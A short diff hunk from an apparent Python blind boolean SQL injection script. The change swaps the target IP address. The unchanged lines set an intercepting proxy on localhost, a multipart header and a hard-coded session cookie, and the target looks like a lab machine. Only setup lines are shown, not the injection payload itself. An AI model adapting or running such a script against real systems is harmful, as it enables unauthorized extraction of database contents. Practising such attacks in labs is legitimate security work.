@@ -29,7 +29,7 @@ def create_offset_num():
     
 # Run blind boolean sql injection
 def sqli(substring_num, offset_num, num):
-    target="152.16.1.122"
+    target="152.16.1.102" 
     proxies= {"http":"http://127.0.0.1:8080"}
     headers={"Content-Type": "multipart/form-data; boundary=---------------------------14194286839629436173433476678"}
     cookies= {"PHPSESSID":"uid6fpgvaiqjoumjtif5da5lt5"}
